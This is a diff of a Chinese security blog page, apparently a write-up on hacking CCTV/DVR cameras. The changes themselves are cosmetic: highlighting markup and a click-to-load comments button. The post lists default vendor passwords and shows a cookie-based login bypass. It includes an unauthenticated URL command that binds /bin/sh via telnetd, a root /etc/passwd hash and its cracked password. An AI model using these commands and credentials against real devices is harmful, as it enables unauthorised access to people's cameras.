@@ -214,13 +214,13 @@ Vivotek: root/
 Ubiquiti: ubnt/ubnt
 Wodsee: admin/</code></pre><p>弱口令太简单了就不做演示了。。。</p>
 <h2 id="WEB认证绕过"><a href="#WEB认证绕过" class="headerlink" title="WEB认证绕过"></a>WEB认证绕过</h2><p>cctv存在web认证绕。<br>当你第一次访问的时候，index.html会要求你输入用户名和密码，输入正确，则跳转到view2.html。如果你直接访问view2.html，会被重定向到index.html，要求你输入帐户信息。而其中view2.html中关于登陆验证的代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line">        dvr_camcnt = Cookies.get(&quot;dvr_camcnt&quot;);</span><br><span class="line">        iSetAble = Cookies.get(&quot;iSetAble&quot;);</span><br><span class="line">        iPlayBack = Cookies.get(&quot;iPlayBack&quot;);</span><br><span class="line">        dvr_usr = Cookies.get(&quot;dvr_usr&quot;);</span><br><span class="line">        dvr_pwd = Cookies.get(&quot;dvr_pwd&quot;);</span><br><span class="line">        if(iSetAble == &apos;0&apos;)&#123;</span><br><span class="line">                $(&apos;#pb_settings&apos;).css(&apos;display&apos;,&apos;none&apos;);</span><br><span class="line">                &#125;</span><br><span class="line">        if(iPlayBack == &apos;0&apos;)&#123;</span><br><span class="line">                $(&apos;#pb_review&apos;).css(&apos;display&apos;,&apos;none&apos;);</span><br><span class="line">                &#125;</span><br><span class="line">        if(dvr_camcnt == null || dvr_usr == null || dvr_pwd == null)</span><br><span class="line">        &#123;</span><br><span class="line">                location.href = &quot;/index.html&quot;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(<span class="function"><span class="keyword">function</span></span>()&#123;</span><br><span class="line">        dvr_camcnt = Cookies.<span class="keyword">get</span>(<span class="string">"dvr_camcnt"</span>);</span><br><span class="line">        iSetAble = Cookies.<span class="keyword">get</span>(<span class="string">"iSetAble"</span>);</span><br><span class="line">        iPlayBack = Cookies.<span class="keyword">get</span>(<span class="string">"iPlayBack"</span>);</span><br><span class="line">        dvr_usr = Cookies.<span class="keyword">get</span>(<span class="string">"dvr_usr"</span>);</span><br><span class="line">        dvr_pwd = Cookies.<span class="keyword">get</span>(<span class="string">"dvr_pwd"</span>);</span><br><span class="line">        <span class="keyword">if</span>(iSetAble == <span class="string">'0'</span>)&#123;</span><br><span class="line">                $(<span class="string">'#pb_settings'</span>).css(<span class="string">'display'</span>,<span class="string">'none'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">if</span>(iPlayBack == <span class="string">'0'</span>)&#123;</span><br><span class="line">                $(<span class="string">'#pb_review'</span>).css(<span class="string">'display'</span>,<span class="string">'none'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">if</span>(dvr_camcnt == <span class="literal">null</span> || dvr_usr == <span class="literal">null</span> || dvr_pwd == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                location.href = <span class="string">"/index.html"</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>可以看到，如果dvr_camcnt,dvr_usr,dvr_pwd这3个值为空，就会跳转到index.html，所以我们只要将dvr_camcnt,dvr_usr,&gt;dvr_pwd设置不为空就可以了。其实只需要设置dvr_usr和dvr_pwd就可以了。因为我们访问这个也面的时候系统已经自动填写了dvr_camcnt。</p>
 </blockquote>
 <p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/camera-cookie.png" alt=""><br>填写后直接访问view2.html,即登陆页面<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/camera-view.png" alt=""></p>
 <h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>另外cctv还存在内建shell。直接telnetd绑定/bin/sh到任意端口，然后telnet连接过去，不需要认证就可以telnet登录，这个利用方式在你不知道固件本身TELNET的账户信息的时候，是个很常见的利用方法。命令如下：<br><code>http://目标ip/shell?/usr/sbin/telnetd -l/bin/sh -p 25</code><br>然后本地就可以telnet直接免密码登陆了<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/camera-telnet.png" alt=""><br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/camera-file.png" alt=""><br>view2.html登陆部分代码<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/camera-code.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cat /etc/passwd</span><br><span class="line">    root:a03e3thxwWU0g:0:0::/root:/bin/sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /etc/passwd</span></span><br><span class="line">    <span class="symbol">root:</span><span class="symbol">a03e3thxwWU0g:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:</span><span class="symbol">:/root</span><span class="symbol">:/bin/sh</span></span><br></pre></td></tr></table></figure>
 <p>破解过后即是”juantech”</p>
 <h2 id="0x04-防御措施"><a href="#0x04-防御措施" class="headerlink" title="0x04 防御措施"></a>0x04 防御措施</h2><p>修改默认密码，加强登陆验证</p>
 <h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ol>
@@ -235,6 +235,9 @@ Wodsee: admin/</code></pre><p>弱口令太简单了就不做演示了。。。</
 </article>
 
     <div class="blog-post-comments">
+        <div style="text-align:center;">
+            <button class="disbtn" id="load-disqus" onclick="disqus.load();">显示评论</button>
+        </div>
         <div id="disqus_thread">
             <noscript>Please enable JavaScript to view the comments.</noscript>
         </div>
@@ -381,14 +384,18 @@ Wodsee: admin/</code></pre><p>弱口令太简单了就不做演示了。。。</
 
     <script type="text/javascript">
         var disqus_shortname = 'zerokeeper';
-
-        (function(){
+        var disqus = {
+        load : function disqus(){
+        (function (){
             var dsq = document.createElement('script');
             dsq.type = 'text/javascript';
             dsq.async = true;
             dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
             (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
         }());
+        $('#load-disqus').remove(); ///加载后移除按钮
+        }
+        }
     </script>
 
 
